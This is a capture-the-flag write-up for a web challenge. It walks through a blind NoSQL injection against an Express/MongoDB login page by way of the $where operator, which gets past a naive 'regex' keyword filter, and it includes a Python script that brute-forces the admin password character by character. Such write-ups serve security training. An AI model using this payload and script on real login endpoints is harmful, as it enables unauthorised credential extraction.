# Description:
**I'd rather die than use a password manager. In other news, can anyone help me remember the login info for my account?**

**There was a source code provided with the chall**

# Walkthrough:
**First, let's access the main page of the website.**

![image](https://github.com/qlashx/ctf_writeups/assets/106611511/035fb34f-cbfd-47fa-9241-e4442dce4140)

**lets look at the sign in page**

![image](https://github.com/qlashx/ctf_writeups/assets/106611511/e91f5753-8bd2-483c-8517-f9f91f42a171)

**Now lets look at the code to get better understanding of the web app**

**in the provided folder we have two importand files firs index.js and second startup.js lets take a look deeper in them**


**startup.js**
![image](https://github.com/qlashx/ctf_writeups/assets/106611511/22639b08-90d1-4782-bdea-6a32a010e584)
**it is a normal file for oppen a connection with mongodb (nosql db) and it create a collection(table) called users and add document in it with data username -> admin password->flag so it is clear that we need to get the flag right <3**


**index.js**
![image](https://github.com/qlashx/ctf_writeups/assets/106611511/855df51e-bc48-4694-be73-b086a5a76baf)

**it is a normal application writen with nodejs and used express as a framework**

**But in the login i notice that there is a vuln with how the code take the data from the user here**

**the developer take the input from the user and pass it fillter function lets see what dose this function do**

```const filter = (input) => {
    if (typeof input === 'string') {
        return input.toLowerCase().includes('regex');
    }
  
    if (typeof input === 'object') {
        return JSON.stringify(input).toLowerCase().includes('regex');
    }
}
```
**it's goal is to convert input to lower and check if it have a regex word in it or not mmmmmmmmmmm interesting**

**lets get back the login route after the filter function return true it start a connection with the db and pass the req.body to the db (it is nosql) wow it only validate that input dosent have a regex word and i have a full control on the request from i can add any paramters i want and it will get passed to the db**

**after the db retrun data it only print a Login successful! here i knowed that iam facing an blindbased nosql injection and i cannot use regex word to get the flag but i have a full control on the paramters that is being passed to the db**

**so what about add the $where operator that makes me able to write a js code that could help me to get the flag so lets first make sure that it accept the where operator by sending this $where:"1" and this $where:"0" and see the difference in the response**

**i deleted the password so it dosent retrun Login failed! every time i have a full control on the paramters DF**

**in $where:"1" we got a Login successful! oh nice**
![image](https://github.com/qlashx/ctf_writeups/assets/106611511/c5d41e41-eb27-4d6b-b984-a417e08c4ff3)

**in  $where:"0" we got Login failed!**
![image](https://github.com/qlashx/ctf_writeups/assets/106611511/60916a21-b6be-4fd5-92d8-a48e2844d608)

**so now we know that on the right statment we will get  Login successful! and on false we will get  Login failed!**

**now how we will get the password ????????**

**so what about do this -> this.password -> if this return true it mean that it see the password filed in the db and we can get the flag by brute forcing its content lets try**

![image](https://github.com/qlashx/ctf_writeups/assets/106611511/761f5b92-194a-4ad7-b68b-a55002918f1c)

**it worked  so first lets know the size but howw? -> like this this.password[0],this.password[20] till it return false it mean that it's size is smaller than the number you are passing after some time i knowed the size was 59**

**now we need to extract the data we can access each char as i saied like this this.password[0] right ? so what about make a bollean statment and check if it return true it mean that this index contain this char**

**like this this.password[0]=="a" if it return true it mean that at index 0 the char is a got it ? <3**
**but iam not doing it for a 59 char XD so i made this script**
```import requests
import json
wordlist = [
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    'A', 'a', 'B', 'b', 'C', 'c', 'D', 'd', 'E', 'e',
    'F', 'f', 'G', 'g', 'H', 'h', 'I', 'i', 'J', 'j',
    'K', 'k', 'L', 'l', 'M', 'm', 'N', 'n', 'O', 'o',
    'P', 'p', 'Q', 'q', 'R', 'r', 'S', 's', 'T', 't',
    'U', 'u', 'V', 'v', 'W', 'w', 'X', 'x', 'Y', 'y',
    'Z', 'z', '~', '!', '@', '#', '$', '%', '^', '&',
    '*', '(', ')', '-', '_', '+', '=', '{', '}', ']',
    '[', '|', '\\', '`', ',', '.', '/', '?', ';', ':',
    "'", '"', '<', '>', ' '
]

password = ''

# Define the JSON data
data = {"username": "admin", "$where": ""}

# Iterate through each character in the wordlist
for i in range(60):
    for char in wordlist:
        data["$where"] = f"this.password[{i}]=='{char}'"


        response = requests.post('http://35.232.242.42:5249/login', json=data)

        if response.status_code == 200:
            password += char
            i = i+1
            print("Password:", password)
            break

print("Password:", password)```

**and after you run this you will get the flag GGGGGGGGGG**

flag -> squ1rrel{7h0ugh7_y0u_c0u1d_regex_y0ur_way_0u7_0f_7h1s_ay3?}







